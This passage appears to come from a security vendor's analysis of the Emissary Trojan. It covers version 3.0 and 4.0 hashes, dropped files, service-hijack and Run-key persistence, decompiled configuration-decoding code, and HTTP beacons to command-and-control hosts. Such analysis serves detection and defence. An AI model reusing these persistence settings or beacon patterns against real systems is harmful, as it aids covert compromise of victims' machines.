			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /lightserver/Default.aspx HTTP/1.0
Cache-Control: no-cache
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: groupspace.findhere.org
Cookie: guid=8E550BBD-F5DB-4471-BBC7-E8768BD5003E; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e27265081599-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e27265081599-2">2</div><div class="crayon-num" data-line="crayon-671986a833e27265081599-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e27265081599-4">4</div><div class="crayon-num" data-line="crayon-671986a833e27265081599-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e27265081599-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span>/<span class="crayon-i">lightserver</span>/<span class="crayon-st">Default</span><span class="crayon-sy">.</span><span class="crayon-e">aspx </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e27265081599-2"><span class="crayon-i">Cache</span>-<span class="crayon-i">Control</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span>-<span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-671986a833e27265081599-3"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">4.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">compatible</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">MSIE</span><span class="crayon-h"> </span><span class="crayon-cn">7.0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e27265081599-4"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">groupspace</span><span class="crayon-sy">.</span><span class="crayon-i">findhere</span><span class="crayon-sy">.</span><span class="crayon-e">org</span></div><div class="crayon-line" id="crayon-671986a833e27265081599-5"><span class="crayon-i">Cookie</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">guid</span>=<span class="crayon-cn">8E550BBD</span>-<span class="crayon-i">F5DB</span>-<span class="crayon-cn">4471</span>-<span class="crayon-i">BBC7</span>-<span class="crayon-i">E8768BD5003E</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">op</span>=<span class="crayon-cn">1635b097</span>-<span class="crayon-i">ffe4</span>-<span class="crayon-cn">4711</span>-<span class="crayon-cn">89e6</span>-<span class="crayon-cn">7f8c7f4cdca6</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The logging functionality within this update no longer includes error ID values, but still contains verbose debug messages that are written to a file named %TEMP%\msmqinst.ax.</p>
<h4>Version 3.0</h4>
<p><strong>Date: 12/24/2014</strong></p>
<p>SHA256: dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3</p>
<p>Original Name: Generic.dll</p>
<p>Bug fixes:</p>
<ul>
<li>Added a function to the configuration update command that checks to see if the C2 provided a new sleep interval at offset 460 and uses the interval stored in the VbaData registry key if its missing. This fixes the bug that would not allow the sleep interval to update correctly.</li>
</ul>
<h4>Version 4.0</h4>
<p><strong>Date: 3/26/2015</strong></p>
<p>SHA256: 5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58</p>
<p>Original Name: Generic.dll</p>
<p>This version of Emissary includes both the installation and loading functionality along with the Emissary functional code in the same file. The installation and loading portion of the Trojan is called using an exported function named "Setting", which moves the file to:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e28801967968" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%TEMP%\Remdisk.dll</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e28801967968-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e28801967968-1"><span class="crayon-sy">%</span><span class="crayon-i">TEMP</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">Remdisk</span><span class="crayon-sy">.</span><span class="crayon-i">dll</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p>The loading portion of this version of Emissary checks the permissions of the current user and either installs Emissary as a service or as a standalone Trojan. To install as a service, the loader will enumerate the services on the system looking for services running under the "netsvcs" group, and it will attempt to hijack the first "netsvcs" service by replacing the "ServiceDLL" parameter to point to the Emissary DLL. For instance, during the analysis period, the installation code changed the following registry key of the AppMgmt:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e2a834254030" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt\Parameters\ServiceDll: "%SystemRoot%\System32\appmgmts.dll"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e2a834254030-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e2a834254030-1"><span class="crayon-i">HKLM</span><span class="crayon-sy">\</span><span class="crayon-i">SYSTEM</span><span class="crayon-sy">\</span><span class="crayon-i">CurrentControlSet</span><span class="crayon-sy">\</span><span class="crayon-i">Services</span><span class="crayon-sy">\</span><span class="crayon-i">AppMgmt</span><span class="crayon-sy">\</span><span class="crayon-i">Parameters</span><span class="crayon-sy">\</span><span class="crayon-i">ServiceDll</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-s">"%SystemRoot%\System32\appmgmts.dll"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>to</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e2b789833556" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt\Parameters\ServiceDll: "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\Remdisk.dll"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e2b789833556-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e2b789833556-1"><span class="crayon-i">HKLM</span><span class="crayon-sy">\</span><span class="crayon-i">SYSTEM</span><span class="crayon-sy">\</span><span class="crayon-i">CurrentControlSet</span><span class="crayon-sy">\</span><span class="crayon-i">Services</span><span class="crayon-sy">\</span><span class="crayon-i">AppMgmt</span><span class="crayon-sy">\</span><span class="crayon-i">Parameters</span><span class="crayon-sy">\</span><span class="crayon-i">ServiceDll</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-s">"C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\Remdisk.dll"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>If the user does not have permissions to add a service, the installation routine attempts to add persistence by creating the following registry key that will run the functional code within Emissary via an exported function named "DllRegister":</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e2c603788198" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Software\Microsoft\Windows\CurrentVersion\Run\Resolves: "Rundll32.exe C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\Remdisk.dll,DllRegister"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e2c603788198-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e2c603788198-1"><span class="crayon-i">Software</span><span class="crayon-sy">\</span><span class="crayon-i">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-i">Windows</span><span class="crayon-sy">\</span><span class="crayon-i">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-i">Run</span><span class="crayon-sy">\</span><span class="crayon-i">Resolves</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-s">"Rundll32.exe C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\Remdisk.dll,DllRegister"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>This version of emissary has its configuration appended to the end of the DLL, specifically starting at offset 0xc600. The following code accesses the configuration embedded within the DLL and decrypts it using a single byte XOR algorithm using 65 as the key:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e2d882935511" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
SetFilePointer(v2, 0xC600, 0, 0);
ReadFile(h_emissary_dll_file, buffer_for_config, 0x1D0u, &amp;NumberOfBytesRead, 0);
iteration_count = 0;
do
  *(iteration_count++ + buffer_for_config) += 65;
while ( iteration_count &lt; 0x1D0 );</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e2d882935511-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e2d882935511-2">2</div><div class="crayon-num" data-line="crayon-671986a833e2d882935511-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e2d882935511-4">4</div><div class="crayon-num" data-line="crayon-671986a833e2d882935511-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e2d882935511-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e2d882935511-1"><span class="crayon-e">SetFilePointer</span><span class="crayon-sy">(</span><span class="crayon-i">v2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0xC600</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e2d882935511-2"><span class="crayon-e">ReadFile</span><span class="crayon-sy">(</span><span class="crayon-i">h_emissary_dll_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">buffer_for_config</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x1D0u</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;NumberOfBytesRead, 0);</span></div><div class="crayon-line" id="crayon-671986a833e2d882935511-3"><span class="crayon-i">iteration_count</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e2d882935511-4"><span class="crayon-st">do</span></div><div class="crayon-line" id="crayon-671986a833e2d882935511-5"><span class="crayon-h">&nbsp;&nbsp;</span>*<span class="crayon-sy">(</span><span class="crayon-i">iteration_count</span>++<span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-i">buffer_for_config</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>+=<span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e2d882935511-6"><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">iteration_count</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">0x1D0</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>This algorithm differs from the algorithm introduced in Emissary version 2.0 that used the srand and rand functions to generate a key to use in conjunction with the XOR operation. With the configuration embedded within the Emissary DLL, each Emissary version 4.0 sample will have a different hash as the configuration data changes.</p>
<p>The network beacon sent from Emissary version 4.0 is the same as other previous versions starting at version 2.0, as seen in the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e2e044107517" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /lightserver/Default.aspx HTTP/1.0
Cache-Control: no-cache
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: 210.209.121.92
Cookie: guid=7DA53AE4-C155-40b3-8EB3-60C4FCE99025; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e2e044107517-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e2e044107517-2">2</div><div class="crayon-num" data-line="crayon-671986a833e2e044107517-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e2e044107517-4">4</div><div class="crayon-num" data-line="crayon-671986a833e2e044107517-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e2e044107517-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span>/<span class="crayon-i">lightserver</span>/<span class="crayon-st">Default</span><span class="crayon-sy">.</span><span class="crayon-e">aspx </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e2e044107517-2"><span class="crayon-i">Cache</span>-<span class="crayon-i">Control</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span>-<span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-671986a833e2e044107517-3"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">4.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">compatible</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">MSIE</span><span class="crayon-h"> </span><span class="crayon-cn">7.0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e2e044107517-4"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">210.209.121.92</span></div><div class="crayon-line" id="crayon-671986a833e2e044107517-5"><span class="crayon-i">Cookie</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">guid</span>=<span class="crayon-cn">7DA53AE4</span>-<span class="crayon-i">C155</span>-<span class="crayon-cn">40b3</span>-<span class="crayon-cn">8EB3</span>-<span class="crayon-cn">60C4FCE99025</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">op</span>=<span class="crayon-cn">1635b097</span>-<span class="crayon-i">ffe4</span>-<span class="crayon-cn">4711</span>-<span class="crayon-cn">89e6</span>-<span class="crayon-cn">7f8c7f4cdca6</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<h4>Version 3.0: Out-of-sequence</h4>
<p><strong>Date: 6/25/2015</strong></p>
<p>SHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a</p>
<p>Original Name: IISDLL.dll</p>
<p><strong>Major Overhaul</strong></p>
<p>The compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of order, as it occurs after the compilation of Emissary version 4.0. The differences between this out of order sample compared to the other known version 3.0 sample, as well as version 4.0 for that matter, include a dramatic change in configuration storage and the handling of commands. Also, the files stored on the system have different names than Emissary versions in the past, which are:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e2f588240152" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%TEMP%\000IISA758C8FEAE5F.TMP -&gt; Log file
%APPDATA%\LocalData\75BD50EC.DAT -&gt; Configuration file
%APPDATA%\LocalData\A08E81B411.DAT -&gt; Emissary DLL</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e2f588240152-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e2f588240152-2">2</div><div class="crayon-num" data-line="crayon-671986a833e2f588240152-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e2f588240152-4">4</div><div class="crayon-num" data-line="crayon-671986a833e2f588240152-5">5</div></div>
				</td>
